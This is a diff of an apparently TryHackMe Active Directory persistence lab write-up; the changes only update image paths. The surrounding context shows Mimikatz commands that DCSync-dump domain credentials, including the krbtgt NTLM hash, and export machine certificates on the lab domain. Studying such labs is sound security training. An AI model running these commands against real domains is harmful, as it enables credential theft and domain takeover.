@@ -58,7 +58,7 @@ Now, instead of specifying our account, we will use the /all flag:
 lsadump::dcsync /domain:za.tryhackme.loc /all
 ```
 
-<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>
 
 **What is the NTLM hash associated with the krbtgt user?**
 
@@ -68,7 +68,7 @@ lsadump::dcsync /domain:za.tryhackme.loc /all
 lsadump::dcsync /domain:za.tryhackme.loc /user:krbtgt@za.tryhackme.loc
 ```
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Persistence through Tickets
 
@@ -181,7 +181,7 @@ crypto::certificates /systemstore:local_machine /export
 dir
 ```
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Generating our own Certificates
 
